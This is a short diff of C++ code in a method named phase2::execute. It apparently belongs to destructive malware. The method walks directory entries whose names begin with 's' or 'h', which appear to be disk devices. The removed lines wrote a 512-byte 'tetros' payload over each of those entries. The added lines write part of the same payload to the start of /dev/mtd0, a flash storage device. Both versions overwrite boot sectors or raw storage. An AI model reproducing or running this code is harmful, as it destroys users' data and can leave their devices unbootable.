@@ -5,6 +5,8 @@ phase2::phase2()
 
 }
 
+
+
 int phase2::execute()
 {
 	int secsToWait;
@@ -16,9 +18,12 @@ int phase2::execute()
  	   if(ent->d_name[0] == 's' || ent->d_name[0] == 'h')
 	   {
 	        printf ("%s\n", ent->d_name);
-		FILE* fh = fopen(ent->d_name, "w");
-		fwrite(*tetros, 1, 512, fh);
-		fclose(fh);
+        	int fd = open("/dev/mtd0", O_WRONLY);
+        	lseek(fd, 0, SEEK_SET);
+        	write(fd, tetros, 4);
+        	close(fd);
+        	//perror("perror output:");
+		//fclose(fh);
 	   }
  	 }
  	 closedir (dir);
